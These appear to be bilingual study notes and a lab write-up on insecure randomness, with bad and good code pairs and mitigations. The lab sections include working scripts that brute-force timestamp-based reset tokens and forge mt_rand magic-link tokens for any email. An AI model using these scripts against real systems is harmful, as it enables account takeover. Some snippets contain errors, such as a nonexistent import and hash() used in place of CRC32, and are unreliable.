# Insecure Randomness
## What Is It?
Web applications rely on random values for session tokens, password reset links, CSRF tokens, and cryptographic keys. When these values are predictable or poorly generated, attackers can guess or reproduce them — turning a security mechanism into a vulnerability.

---

## Types of Random Number Generators

1. Pseudo-Random Number Generators (PRNGs)
These use a mathematical formula seeded with an initial value. Given the same seed, they always produce the same sequence.

Example: Python's ```random.random()``` — fine for simulations, dangerous for security tokens.

2. Cryptographically Secure PRNGs (CSPRNGs)
These draw from unpredictable system entropy and are designed for security purposes.

Example: ```secrets.token_hex(32)``` in Python or ```crypto.randomBytes()``` in Node.js.

--- 

## Core Vulnerability Types
Weak or Insufficient Randomness
Using low-entropy sources means the output space is small and brute-forceable.

```python 
# BAD – only 32,768 possible values
import random
token = random.randint(0, 32767)
```
```python 
# GOOD – astronomically large output space
import secrets
token = secrets.token_hex(32)
```

--- 

## Predictable Seeds During Token Generation
If the seed is derived from something guessable — like the current timestamp — an attacker who knows roughly when a token was generated can reproduce the entire sequence.

```python 
# BAD – seed is the current time (guessable within seconds)
import random, time
random.seed(int(time.time()))
reset_token = random.randint(100000, 999999)
```
```
Attack scenario: A password reset link is generated at a known time. The attacker seeds their own PRNG with nearby timestamps, generates all possible tokens, and tries each one — potentially hijacking the account reset.
```
## Session Hijacking via Predictable Session IDs
If session IDs follow a pattern (e.g., sequential or time-based), an attacker can enumerate valid sessions.

```bash
Session IDs observed:
  sess_10423
  sess_10424
  sess_10425   ← attacker guesses sess_10426 and hijacks it
  ```

  ## Cryptographic Key Weakness
Using a weak seed for key generation makes encryption breakable.

```javascript
// BAD – Math.random() is not cryptographically secure
const key = Math.random().toString(36);

// GOOD
const key = crypto.randomBytes(32).toString('hex');
```
## Key Takeaway
Randomness is only secure if it is unpredictable and has a large enough space that brute force is infeasible. Any shortcut — reusing seeds, using time as entropy, or relying on non-cryptographic PRNGs — creates an exploitable window for attackers.

--- 

## Randomness in Security
Randomness
Randomness is the absence of pattern or predictability in data. In secure systems, it ensures that generated values — keys, tokens, nonces — cannot be guessed or reproduced by an attacker.

### Type          |  How It Works                            |   Example Source
---
TRNG (True RNG)   |  Harvests physical, unpredictable events  | Mouse movement, CPU thermal noise, hardware chips

---
PRNG (Pseudo RNG) | Mathematical formula from a starting seed |  ```random.random()```, ```Math.random()```.


```
TRNGs are inherently unpredictable. PRNGs look random but are fully deterministic — same seed always yields same output.
```

## Entropy
Entropy measures the amount of unpredictability in a system. Think of it as the "quality" of randomness.

High entropy → large, unpredictable output space → hard to brute-force
Low entropy → small, guessable output space → easy to attack

--- 

```python
# Low entropy – only 4 digits, 10,000 possible values
token = str(random.randint(0, 9999))   # attacker brute-forces in seconds

# High entropy – 256 bits of randomness, 2²⁵⁶ possible values
token = secrets.token_hex(32)          # practically unguessable
```

```
A token derived from a timestamp has very low entropy — the attacker already knows roughly what the seed was.
```

## Cryptographic Keys
Keys are secret values fed into encryption algorithms. Their security depends on two things: length and randomness.

```python 
# BAD – short, low-entropy key
key = "password123"

# BAD – generated with weak PRNG
import random
key = str(random.getrandbits(64))

# GOOD – cryptographically secure, high entropy
from cryptography.hazmat.primitives.keygen import generate_key
key = os.urandom(32)   # 256 bits from OS entropy pool
```

```
If a key is predictable, an attacker can reproduce it and decrypt all protected data — making encryption useless regardless of algorithm strength.
```

## Session Tokens & Unique Identifiers
Session tokens track authenticated users between requests. They must be unpredictable and unique — otherwise attackers can guess valid sessions.

```bash
# BAD – sequential token (predictable pattern)
user_1 → sess_1001
user_2 → sess_1002
user_3 → sess_1003   ← attacker guesses sess_1004 and hijacks next session

# GOOD – cryptographically random token
user_1 → a3f8c92d1b...  (128 bits, no pattern)
user_2 → 7e41bc039f...  (completely unrelated to user_1's token)
```

```python 
# GOOD session token generation
import secrets
session_token = secrets.token_urlsafe(32)
```

## Seeding
A seed is the initial value fed into a PRNG. The entire output sequence is mathematically derived from it — making the seed the single point of failure.

```python 
import random

# Same seed → identical sequence every time
random.seed(42)
print(random.randint(0, 1000))   # always outputs: 654

random.seed(42)
print(random.randint(0, 1000))   # still outputs: 654
```

## Real-world attack scenario:

```
1. App generates a password reset token seeded with current Unix timestamp
2. Attacker requests a reset and notes the exact time (e.g., 1713744000)
3. Attacker seeds their own PRNG with timestamps ±5 seconds
4. Attacker generates all possible token sequences
5. Attacker tries each token → account compromised
```

The fix is to never use guessable values (time, user ID, IP address) as seeds. Use OS-level entropy instead: ```os.urandom()```, ```/dev/urandom```, or a hardware RNG.

## How It All Connects
```
Low Entropy Seed
      ↓
Predictable PRNG Output
      ↓
Weak Session Token / Crypto Key
      ↓
Brute Force / Prediction Attack
      ↓
Authentication Bypass / Data Decryption
```
The entire chain collapses if any one element — seed, entropy source, or generator — is weak. Secure randomness requires high entropy at the source, a CSPRNG for generation, and sufficient output length to make guessing infeasible.

--- 

## Types of RNGs
True Random Number Generator (TRNG)
TRNGs derive randomness from unpredictable physical phenomena — events that are genuinely impossible to predict or reproduce, making them the gold standard for cryptographic security.

### Source               |           What's Measured

Thermal noise        |     Random electron movement in resistors

Radioactive decay    |      Unpredictable atomic disintegration timing

Atmospheric noise    |      Radio static from electromagnetic interference

Photon behavior      |      Quantum-level light particle behavior

Hardware events      |      CPU timing jitter, disk seek times

---

## How It Works
 
```bash
Physical Event (e.g., thermal noise)
        ↓
Analog signal captured by hardware sensor
        ↓
Converted to digital bits
        ↓
True random output  →  e.g., cryptographic key
```

No mathematical formula is involved — the randomness comes directly from nature, so there is no seed, no pattern, no reproducibility.

## Primary Use Cases
1. Cryptographic Key Generation
Algorithms like RSA and AES require keys that are absolutely unpredictable. A TRNG ensures no attacker can reproduce the key generation process.

```bash 
RSA-2048 key pair generation:
  → Requires ~2048 truly random bits
  → TRNG feeds raw entropy into key generation algorithm
  → Even with full knowledge of the system, key cannot be predicted
  ```

  2. Digital Signatures
Signing requires a fresh random value (nonce) each time. If this value repeats or is predictable, the private key can be mathematically extracted.

```bash 
# Real-world consequence of weak nonce in ECDSA signing:
# Sony PlayStation 3 (2010) used a FIXED nonce for all signatures
# → Private signing key was fully recovered by attackers
# → Entire code-signing system broken
```
 3. Certificate Creation (TLS/SSL)
Certificate authorities use TRNGs when generating the keys embedded in HTTPS certificates, ensuring each certificate's private key is unique and unguessable.

## Advantages vs. Limitations

```
✅ Genuinely unpredictable — not reproducible even with full system knowledge
✅ Highest entropy quality available
✅ No seed dependency

❌ Requires specialised hardware (HSMs, hardware RNG chips)
❌ Slower generation speed — entropy must be "collected" from physical events
❌ Not suitable for high-volume, rapid number generation
❌ More expensive to deploy at scale
```

## Real-World Hardware Examples

```
Intel RDRAND instruction  →  built-in CPU hardware RNG using thermal noise
/dev/random (Linux)       →  collects entropy from hardware events (keystrokes, 
                              interrupts, disk I/O)
HSM (Hardware Security    →  dedicated device for key generation in banks,
Module)                       certificate authorities, and governments
Cloudflare's lava lamps   →  cameras filming 100 lava lamps feed visual entropy 
                              into their RNG system
```

## TRNG vs. PRNG at a Glance

```
TRNG:   Physical world → unpredictable bits → no seed → not reproducible
PRNG:   Seed value → mathematical formula → predictable sequence → reproducible
```
TRNGs are the foundation of trust in high-stakes cryptography. However, because they are slow and hardware-dependent, most systems use a hybrid approach — a TRNG seeds a CSPRNG, combining true unpredictability with fast, scalable output.



# Weak or Insufficient Entropy 
### What Is It?
Entropy is the unpredictability that makes random values secure. When an application draws randomness from weak or predictable sources, the output space shrinks dramatically — turning a theoretically large key space into something an attacker can brute-force in seconds.


| Source | Why It's Weak |
| :--- | :--- |
| **Unix timestamp** | Only ~86,400 unique values per day; guessable within seconds of a known event. |
| **System clock (ms)** | ~86 million values — sounds large, but trivially brute-forceable. |
| **User ID or IP address** | Sequential or structured, tiny search space. |
| **Process ID (PID)** | Typically 1–32,768 on Linux. |
| **Predictable user input** | Keyboard patterns, common words — not random at all. |
| **rand() seeded with time** | Combines two weak sources into one weak output. |

## Practical Examples
## Example 1 — Timestamp-seeded encryption key

```python
import random, time

# BAD — seed is current Unix timestamp (guessable)
random.seed(int(time.time()))
key = random.getrandbits(128)

# Attack: attacker knows the token was generated "around" a certain time.
# They iterate over timestamps ±300 seconds = only 600 attempts needed.
for ts in range(known_time - 300, known_time + 300):
    random.seed(ts)
    candidate = random.getrandbits(128)
    if candidate == intercepted_key:
        print(f"Key cracked with seed: {ts}")
        break
```
A 128-bit key looks strong, but with a timestamp seed it has an effective entropy of just ~17 bits (log₂(86400) ≈ 16.4).

## Example 2 — Password reset token from system clock

```python
import time

# BAD — token is just the current time in milliseconds
token = str(int(time.time() * 1000))
# e.g. "1713744823041"
# Attacker observes when reset was requested → tries ±5 seconds = 10,000 values

# GOOD
import secrets
token = secrets.token_urlsafe(32)  # 256 bits of OS entropy
```
## Example 3 — Weak session ID in a web app

```php
// BAD — session ID built from predictable components
$session_id = md5($_SERVER['REMOTE_ADDR'] . time() . rand());
// IP is known, time is guessable, rand() is seeded internally from time
// MD5 hashing doesn't add entropy — it just transforms predictable input

// GOOD
$session_id = bin2hex(random_bytes(32)); // CSPRNG, 256 bits
```

## Example 4 — Low-entropy key in JavaScript

```javascript
// BAD — Math.random() has recoverable internal state
function generateKey() {
  return Math.floor(Math.random() * 1000000).toString();
  // Only 1,000,000 possible values — brute-forceable instantly
}

// GOOD
function generateKey() {
  return crypto.getRandomValues(new Uint8Array(32))  // OS entropy
               .reduce((hex, b) => hex + b.toString(16).padStart(2, '0'), '');
}
```

## How an Attacker Exploits Weak Entropy

```1. Observe a generated value (token, session ID, encrypted message)
         ↓
2. Identify the entropy source (timestamp? PID? clock?)
         ↓
3. Estimate the seed range (e.g., ±5 minutes around a known event)
         ↓
4. Iterate over all candidate seeds (~600 for seconds, ~600,000 for ms)
         ↓
5. Reproduce the PRNG output for each candidate
         ↓
6. Match against the intercepted value → seed (and all future values) known
```

- The Fix: Use OS-Level Entropy
Modern operating systems maintain a high-entropy pool fed by genuinely unpredictable hardware events. Always draw from it:


| Lenguaje / Entorno | Método de Generación Segura |
| :--- | :--- |
| **Python** | `secrets.token_hex(32)` o `os.urandom(32)` |
| **JavaScript (Node)** | `crypto.randomBytes(32)` |
| **JavaScript (Browser)** | `crypto.getRandomValues(new Uint8Array(32))` |
| **PHP** | `random_bytes(32)` |
| **Java** | `new SecureRandom()` |
| **C#** | `RandomNumberGenerator.Create()` |

The key insight: entropy cannot be manufactured by an algorithm. No amount of hashing, XORing, or mathematical transformation can make a predictable seed unpredictable. The only fix is to start with a genuinely high-entropy source from the OS or hardware.

## Practical Scenario – Weak Entropy in Reset Tokens
### Background
A web application generates password reset tokens using a weak and predictable source of entropy. The aim of this lab is to understand why this approach is insecure by analysing how the token is constructed and how it can be predicted.

## Infraestructura del laboratorio


| Servicio | URL | Función |
| :--- | :--- | :--- |
| **Web app** | http://random.thm:8090/case/ | Login + forgot password |
| **Mail server** | http://random.thm:8090/mail/ | Recibe el link de reset |


## Flow of the attack

```
1. User ‘victim’ requests a password reset
         ↓
2. Server generates a token using a weak source
   (e.g. username + Unix timestamp)
         ↓
3. Link sent to email: /reset_password.php?token=victim1776917300
         ↓
4. Attacker observes the link (or deduces the timestamp)
         ↓
5. Attacker iterates over a range of timestamps ±300 seconds
         ↓
6. Valid token found → access to the account

Translated with DeepL.com (free version)
```

## Why it is insecure
The token is constructed as follows:

```
token = username + unix_timestamp
```
## This has extremely low entropy because:

* The username is known or can be brute-forced
* The timestamp is predictable — if the attacker knows when the reset was requested (±5 mins), the search space is only 600 values
* There is no cryptographic component or true randomness

```python 
# Lo que hace el servidor vulnerable (internamente)
import time
token = username + str(int(time.time()))
# Ej: "victim1713744823"  ← completamente predecible
```

## Comparison: unsafe vs safe

```python
# INSEGURO — lo que hace la app vulnerable
token = f"{username}{int(time.time())}"
# Espacio: ~600 valores en ventana de ±5 min

# SEGURO — lo que debería hacer
import secrets
token = secrets.token_urlsafe(32)
# Espacio: 2²⁵⁶ valores, imposible de bruteforcear
```

```python 
import requests
import sys

def brute_force_token(username, start_timestamp):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Buscar en ambas direcciones: ±5 minutos
    for i in range(-300, 301):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        if "Invalid or expired token." not in response.text:
            print(f"[+] Token válido encontrado: {token}")
            print(f"[+] Respuesta: {response.text[:200]}")
            return token
        else:
            print(f"[-] Probando: {token}")
    
    print("[!] No se encontró token válido en el rango ±300 segundos.")
    return None

if len(sys.argv) != 3:
    print("Uso: python exploit.py <username> <unix_timestamp>")
    sys.exit(1)

username = sys.argv[1]
start_timestamp = int(sys.argv[2])

brute_force_token(username, start_timestamp)
```
## Main Objective
The script attempts to guess a password recovery token based on the assumption that the token is generated by combining the username and the exact time (Unix timestamp) at which the reset was requested.

## Step-by-Step Guide
- Data input: The script accepts the username and a time reference (the time at which you believe the reset email was generated) via the command line.
- Generating Candidates: The script assumes there may be a time lag between the server and your clock. Therefore, it generates tokens for a range of 601 seconds (5 minutes before and 5 minutes after the time you provided).
- Token Construction: Creates the token by concatenating the text: username + timestamp (example: admin1618432000).
- HTTP test: Sends a GET request to the web application URL, passing the token as a parameter.
- Validation: Analyses the server’s response. If the page does not contain the phrase “Invalid or expired token.”, the script assumes it has found the correct token and stops the search.

## Why the Token is Weak
- The vulnerability stems from two interconnected flaws:
* Low Entropy Sources:
    - Predictability: The time() function returns a simple Unix timestamp representing the current second.
    - Known Inputs: An attacker often knows the username and can estimate when a request was made, reducing the "randomness" to near zero.
    - Deterministic Nature: High-quality tokens should be generated by a CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) like PHP's random_bytes(), which uses unpredictable system noise rather than simple clock time.
* Small Search Space:
    - Limited Possibilities: Because the timestamp only changes once per second, there are only 60 possible values per minute.
    - Brute-Force Feasibility: An attacker doesn't need to guess billions of combinations. They only need to test timestamps within a narrow window (e.g., 5-10 minutes) around the time they triggered the token generation.
    - Simultaneous Derivation: If multiple tokens are generated nearly at once, their values will be almost identical, allowing an attacker to derive one from another.


# Predictable seed in PRNGs 

## Predictable Seeds en PRNGs – Resumen con Ejemplos
### Concepto central

Cuando un PRNG se inicializa con una semilla predecible, toda la secuencia de números "aleatorios" puede ser reproducida por un atacante. La seguridad del sistema colapsa completamente — no importa cuán complejo sea el algoritmo, si la semilla es débil, la salida es predecible.

## Impacto en distintos sistemas

1. CAPTCHA bypass

```
Servidor genera CAPTCHA:
  mt_srand(timestamp)        ← semilla predecible
  $challenge = mt_rand()     ← atacante puede calcular este valor

Atacante:
  1. Observa el timestamp del request
  2. Replica mt_srand(timestamp) localmente
  3. Calcula mt_rand() → obtiene el valor del CAPTCHA antes de verlo
  4. Envía respuesta correcta automáticamente → bot pasa como humano
  ```

  ### 2. Lotería / juegos de azar

  ```
import random

# Servidor vulnerable
random.seed(int(time.time()))      # timestamp como semilla
winning_number = random.randint(1, 100)

# Atacante: conoce el momento del sorteo (público)
random.seed(known_timestamp)
predicted = random.randint(1, 100)  # mismo resultado garantizado
```
### Escenario práctico: ```Magic Link con mt_rand()```

Cómo se genera el token vulnerable:

```php
// Servidor PHP — generación del magic link
$email = "victim@example.com";
$constant = 12345;  // constante fija en el código

// Semilla = CRC32 del email + constante predecible
$seed = crc32($email) + $constant;
mt_srand($seed);

$token = mt_rand();
$magic_link = "http://random.thm:8090/case/login.php?token=" . $token;
```

### Por qué es explotable:

```
CRC32("victim@example.com") → valor FIJO y determinista
         +
Constante hardcodeada → también fija
         =
Semilla SIEMPRE IGUAL para el mismo email
         ↓
mt_rand() produce SIEMPRE el mismo token
```

## Ataque de reverse-engineering

```python
import ctypes

# El atacante replica la lógica del servidor
email = "victim@example.com"
constant = 12345

# CRC32 en Python equivalente al de PHP
seed = ctypes.c_int32(hash(email) & 0xFFFFFFFF).value + constant

# Replica mt_srand + mt_rand localmente
# → obtiene el token sin necesidad de recibirlo
```

### Comparación: vulnerable vs seguro

```php
// VULNERABLE — semilla determinista
$seed = crc32($email) + $constant;
mt_srand($seed);
$token = mt_rand();
// Mismo email → mismo token → siempre predecible

// SEGURO — entropía real del sistema operativo
$token = bin2hex(random_bytes(32));
// 256 bits de entropía real, nunca reproducible
```

### Cadena de explotación completa

```
1. Atacante conoce el email del objetivo (público o enumerado)
         ↓
2. Calcula CRC32(email) + constante → semilla
         ↓
3. Replica mt_srand(seed) + mt_rand() localmente
         ↓
4. Obtiene el token del magic link sin solicitarlo
         ↓
5. Accede directamente a la URL con el token predicho
         ↓
6. Account takeover completado
```
### Lección clave

Una semilla predecible convierte cualquier PRNG — incluso uno estadísticamente robusto como Mersenne Twister — en un generador completamente determinista y explotable. CRC32 de un email no es entropía: es una transformación matemática de datos conocidos. Sumar una constante fija no añade aleatoriedad. El resultado es un token que parece aleatorio pero que cualquier atacante con acceso al código fuente (o que pueda deducir la lógica) puede calcular exactamente.


## Análisis del Magic Link Feature

### Flujo completo del sistema

```
Usuario ingresa email
        ↓
Servidor genera token:
  seed = CONSTANT_VALUE + crc32($email)
  mt_srand(seed)
  $token = base64_encode(mt_rand())
        ↓
Token enviado por email como magic link
        ↓
Usuario hace click → autenticado sin contraseña
```
 ### Anatomía del token
El token ```MTEzNTUwODU0MQ==``` se descompone así:

```python 
import base64

token = "MTEzNTUwODU0MQ=="

# Paso 1: decodificar base64
decoded = base64.b64decode(token).decode()
print(decoded)  # → "1135508541"

# Ese número es exactamente lo que devolvió mt_rand()
# con la semilla: CONSTANT_VALUE + crc32("magic@mail.random.thm")
```

## Por qué es completamente predecible
### El problema de la semilla

```php
// Código del servidor
mt_srand(CONSTANT_VALUE + crc32($email));
$random_number = mt_rand();
$token = base64_encode($random_number);
```

### Cada componente de la semilla es conocido o calculable:


| Componente | Valor | ¿Secreto? |
| :--- | :--- | :--- |
| **CONSTANT_VALUE** | Fijo en el código | No — visible en source o deducible |
| **crc32($email)** | Función determinista del email | No — el email es conocido |
| **Semilla resultante** | Siempre igual para el mismo email | No |

## Reproducción del ataque

```python
import base64
import ctypes

# Datos conocidos por el atacante
email = "victim@mail.random.thm"
CONSTANT_VALUE = 12345  # deducido del código fuente

# Paso 1: calcular CRC32 del email (equivalente al de PHP)
import binascii
crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
crc_signed = ctypes.c_int32(crc).value

# Paso 2: calcular la semilla exacta
seed = CONSTANT_VALUE + crc_signed

# Paso 3: PHP mt_rand con esa semilla produce un valor determinista
# → el atacante puede usar una tool como php-mt-seed o llamar PHP directamente
# php -r "mt_srand($seed); echo mt_rand();"

# Paso 4: codificar en base64
predicted_number = 1135508541  # resultado de mt_rand con esa semilla
predicted_token = base64.b64encode(str(predicted_number).encode()).decode()
print(predicted_token)  # → "MTEzNTUwODU0MQ=="

# Paso 5: construir el magic link
magic_link = f"http://random.thm:8090/case/magic_link_login.php?token={predicted_token}"
print(magic_link)  # → acceso directo sin conocer la contraseña
```
## Debilidades encadenadas

```
Debilidad 1: mt_rand() no es criptográficamente seguro
        +
Debilidad 2: semilla = datos públicos (email + constante)
        +
Debilidad 3: base64 no es cifrado, solo encoding
        =
Token 100% predecible para cualquier email conocido
```
Base64 es frecuentemente confundido con cifrado — no lo es. Solo cambia la representación del dato, no lo protege. Decodificarlo toma milisegundos.

## La corrección adecuada

```php
// VULNERABLE — actual
mt_srand(CONSTANT_VALUE + crc32($email));
$token = base64_encode(mt_rand());

// SEGURO — corrección
$token = bin2hex(random_bytes(32));
// - random_bytes() usa CSPRNG del SO
// - 256 bits de entropía real
// - No hay semilla, no hay patrón, no hay predicción posible
```
## Lección clave

Este escenario ilustra cómo tres decisiones de diseño incorrectas se combinan para crear una vulnerabilidad crítica: usar ```mt_rand()``` en lugar de un CSPRNG, construir la semilla con datos públicos, y confundir base64 con seguridad. Ninguna capa individual parece obviamente rota, pero el resultado es un sistema de autenticación sin contraseña que cualquier atacante puede bypassear calculando el token matemáticamente, sin interceptar ningún email

# Decodificación y Explotación del Token – Resumen con EjemplosPaso 1: 
## Decodificar el token Base64

```python 
import base64

token = "MTEzNTUwODU0MQ=="

# Base64 es solo encoding, no cifrado — se revierte trivialmente
decoded = base64.b64decode(token).decode()
print(decoded)  # → 1135508541

# Este número es el output DIRECTO de mt_rand()
```
## Paso 2: Recuperar la semilla con 
```php_mt_seed```
```php_mt_seed``` es una herramienta que recorre todas las semillas posibles (2³² valores) y encuentra cuál produce el número observado.

```bash
# Se le pasa el output de mt_rand() como argumento
./php_mt_seed 1135508541
```
## Output del tool:

```
seed = 0x318ff649 = 831518281   (PHP 7.1.0+)
seed = 0x39dc3504 = 970732804   (PHP 7.1.0+)  ← semilla correcta
seed = 0x6d8817a7 = 1837635495  (PHP 7.1.0+)
seed = 0xbe3249b3 = 3190966707  (PHP 7.1.0+)
Found 5
```

El tool devuelve múltiples candidatos porque distintas semillas pueden producir el mismo primer valor de ```mt_rand()```. Cada una debe probarse individualmente. En este caso, la semilla correcta es 970732804.

## Paso 3: Recuperar la constante del servidor

La semilla se construyó así en el servidor:

```
seed = CONSTANT_VALUE + crc32($email)
```

Por lo tanto:

```
CONSTANT_VALUE = seed - crc32($email)
```

```python
import binascii, ctypes

seed = 970732804
email = "magic@mail.random.thm"

# Calcular CRC32 del email (igual que PHP)
crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
crc_signed = ctypes.c_int32(crc).value

CONSTANT_VALUE = seed - crc_signed
print(f"Constante del servidor: {CONSTANT_VALUE}")
```

## Paso 4: Generar token para cualquier víctima

    - Con la constante recuperada, el atacante puede calcular el token de cualquier usuario conociendo solo su email:

```python
import base64, binascii, ctypes, subprocess

CONSTANT_VALUE = ???  # recuperado en paso 3

def predict_token(email):
    crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
    crc_signed = ctypes.c_int32(crc).value
    seed = CONSTANT_VALUE + crc_signed
    
    # Llamar PHP directamente para replicar mt_rand exacto
    result = subprocess.run(
        ['php', '-r', f'mt_srand({seed}); echo mt_rand();'],
        capture_output=True, text=True
    )
    random_number = result.stdout.strip()
    token = base64.b64encode(random_number.encode()).decode()
    return token

# Atacante genera token para la víctima sin recibir ningún email
victim_email = "victim@mail.random.thm"
token = predict_token(victim_email)
magic_link = f"http://random.thm:8090/case/magic_link_login.php?token={token}"
print(magic_link)  # → acceso directo a la cuenta de la víctima
```

## Cadena completa del ataque

```
Token capturado del propio email del atacante
        ↓
Base64 decode → número mt_rand(): 1135508541
        ↓
php_mt_seed → semillas candidatas → seed correcta: 970732804
        ↓
seed - crc32(mi_email) → CONSTANT_VALUE recuperada
        ↓
Para cualquier víctima:
  seed = CONSTANT_VALUE + crc32(victim_email)
  token = base64(mt_rand con esa seed)
        ↓
Account takeover sin contraseña ni interceptar emails
```
## Por qué ```php_mt_seed``` funciona:

```
mt_rand() tiene un espacio de semillas de 2³² = ~4 mil millones de valores

A ~58 millones de semillas/segundo:
  4,000,000,000 / 58,000,000 ≈ 69 segundos

→ Cualquier semilla de mt_rand() puede crackearse
  en menos de 2 minutos con hardware modesto
```

## Lección clave

Este ataque demuestra que ```mt_rand()``` no debe usarse en ningún contexto de seguridad. La combinación de: output observable (el token llega al email del atacante), encoding reversible (base64), y seed recuperable en ~5 minutos (php_mt_seed) convierte todo el sistema de autenticación en una fachada. La constante del servidor — aunque parezca un secreto — queda completamente expuesta una vez que el atacante tiene un solo token válido.

# Explotación Final – Constante 1337 y Account Takeover

### Recuperación de la constante

```
seed identificado:        970732804
CRC32("magic@mail.random.thm"):  970731467
                          ---------
CONSTANT_VALUE:               1337
```
Con esta constante, el atacante puede calcular el token de cualquier usuario conociendo solo su email.

## Flujo completo del ataque

```
1. Atacante solicita magic link con su propio email
        ↓
2. Decodifica token → obtiene output de mt_rand()
        ↓
3. php_mt_seed recupera la semilla: 970732804
        ↓
4. seed - crc32(mi_email) = 1337  ← constante del servidor
        ↓
5. Para cualquier víctima:
   seed = crc32(victim@email.com) + 1337
   token = base64(mt_rand(seed))
        ↓
6. Visita magic link con token predicho → sesión activa
```
## Script PHP de explotación

```php
<?php
// Uso: magic_link_login.php?email=victim@mail.random.thm&constant=1337

$email    = $_GET['email'];
$constant = (int)$_GET['constant'];
$seed     = crc32($email) + $constant;

mt_srand($seed);

for ($i = 0; $i < 10; $i++) {
    $token = base64_encode(mt_rand());
    echo "Token $i: $token <br>";
}
```

## Equivalente en Python:

```python
import base64, binascii, ctypes, subprocess

def generate_tokens(email, constant=1337, count=10):
    crc = binascii.crc32(email.encode()) & 0xFFFFFFFF
    seed = ctypes.c_int32(crc).value + constant

    tokens = []
    for i in range(count):
        result = subprocess.run(
            ['php', '-r', f'mt_srand({seed}); '
                          + ''.join([f'mt_rand();' for _ in range(i)])
                          + 'echo mt_rand();'],
            capture_output=True, text=True
        )
        number = result.stdout.strip()
        token = base64.b64encode(number.encode()).decode()
        tokens.append(token)
    return tokens

# Generar tokens para la víctima
for i, t in enumerate(generate_tokens("victim@mail.random.thm")):
    print(f"Token {i+1}: {t}")
```
## Resumen de vulnerabilidades encadenadas

## Análisis de Vulnerabilidades


| Capa | Problema | Consecuencia |
| :--- | :--- | :--- |
| **mt_rand()** | No es CSPRNG | Output reproducible |
| **Semilla = CRC32 + constante** | Datos públicos + valor fijo | Semilla calculable |
| **Base64 encoding** | No es cifrado | Token reversible trivialmente |
| **Constante hardcodeada 1337** | Un solo token la expone | Válida para todos los usuarios |


## La corrección

```php
// VULNERABLE
$seed = crc32($email) + 1337;
mt_srand($seed);
$token = base64_encode(mt_rand());

// SEGURO
$token = bin2hex(random_bytes(32));
// Sin semilla, sin constante, sin patrón
// 256 bits de entropía real del SO
```
## Lección clave

Este escenario muestra que una sola constante hardcodeada destruye la seguridad de todo el sistema. Una vez que un atacante obtiene un token propio y aplica ingeniería inversa, la constante 1337 queda expuesta — y con ella, la capacidad de suplantar a cualquier usuario de la plataforma con solo conocer su email.

# Mitigation Measures:

## Best Practices for Insecure Randomness – Pentesters & Developers
For Pentesters
1. Identify Weak Randomness in Code
During code reviews, flag any use of non-cryptographic RNGs in security-sensitive contexts.

```php 
// Red flags to look for in code reviews
mt_rand()        // PHP — Mersenne Twister, not cryptographically secure
rand()           // PHP/C — even weaker, small output range
Math.random()    // JavaScript — recoverable internal state
random.random()  // Python — MT19937, unsuitable for security tokens
java.util.Random // Java — linear congruential, predictable after 2 outputs
```
## 2. Reverse-Engineer Predictable Tokens
Test whether tokens can be reproduced by recovering the seed.

```bash
# Step 1: decode the token
echo "MTEzNTUwODU0MQ==" | base64 -d
# → 1135508541

# Step 2: recover the seed using php_mt_seed
./php_mt_seed 1135508541
# → seed = 970732804

# Step 3: subtract CRC32 of known email to expose constant
# seed(970732804) - crc32("magic@mail.random.thm")(970731467) = 1337
```
## 3. Test Token Exhaustion (Brute Force)
When tokens are time-based or low-entropy, enumerate the entire search space.

```python
import requests, time

target_url = "http://target.thm/reset_password.php"
known_time  = int(time.time())

# Only 600 attempts needed for a ±5-minute window
for i in range(-300, 301):
    token = f"victim{known_time + i}"
    r = requests.get(target_url, params={"token": token})
    if "Invalid" not in r.text:
        print(f"[+] Valid token found: {token}")
        break
```

## For Secure Code Developers
### 1. Always Use a CSPRNG
Replace every security-sensitive call to a statistical PRNG with a cryptographically secure equivalent.

```php 
// PHP — VULNERABLE vs SECURE
$token = base64_encode(mt_rand());           // BAD
$token = bin2hex(random_bytes(32));          // GOOD — OS entropy, 256 bits
$token = bin2hex(openssl_random_pseudo_bytes(32)); // GOOD alternative
```

```java
// Java — VULNERABLE vs SECURE
Random r = new java.util.Random();           // BAD
SecureRandom sr = new SecureRandom();        // GOOD
byte[] token = new byte[32];
sr.nextBytes(token);
```

```python
# Python — VULNERABLE vs SECURE
import random
token = random.getrandbits(128)              # BAD

import secrets
token = secrets.token_hex(32)               # GOOD — 256 bits of OS entropy
```

## 2. Never Use Predictable Seed Values

```php
// BAD — all of these are guessable or derivable
mt_srand(time());                            // Unix timestamp
mt_srand(crc32($email) + 1337);             // public data + hardcoded constant
mt_srand(getmypid());                        // PID range: 1–32,768
mt_srand(ip2long($_SERVER['REMOTE_ADDR'])); // IP address is known

// GOOD — no seeding needed; OS provides entropy directly
$token = bin2hex(random_bytes(32));
```
## 3. Regenerate Randomness for Every Critical Operation

```php
// BAD — reusing the same token across requests
$_SESSION['reset_token'] = $token_generated_at_startup;

// GOOD — fresh token generated per request, per user
function generate_reset_token(): string {
    return bin2hex(random_bytes(32)); // new entropy every call
}

// Also: expire tokens after single use
// DELETE FROM tokens WHERE token = ? AND used = 1;
```

## 4. Use Secure Functions for Cryptographic Key Generation

```php 
// PHP — secure RSA key generation
$key = openssl_pkey_new([
    'private_key_bits' => 2048,
    'private_key_type' => OPENSSL_KEYTYPE_RSA,
]);
// openssl_pkey_new() draws entropy from /dev/urandom internally
```
```python 
# Python — secure key generation
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
# Internally uses os.urandom() — CSPRNG backed by the OS
```

## Quick Reference: Insecure vs. Secure Implementation


| Context | Insecure | Secure |
| :--- | :--- | :--- |
| **Session tokens** | `mt_rand()`, `rand()` | `random_bytes(32)` |
| **Password reset links** | Timestamp-based | `secrets.token_urlsafe(32)` |
| **Magic links** | CRC32 + constant seed | `bin2hex(random_bytes(32))` |
| **Cryptographic keys** | `Math.random()` | `SecureRandom`, `openssl_pkey_new()` |
| **CAPTCHA values** | Predictable PRNG | Cryptographically Secure PRNG |


# Key Takeaway

The divide between a vulnerable and a secure implementation is often a single function call. Replacing mt_rand() with random_bytes() costs nothing in development time but eliminates an entire class of attack. For pentesters, the inverse is equally true — if a token can be decoded, its seed recovered, and a constant derived from one sample, every account on the platform is compromised with nothing more than the target's email address.

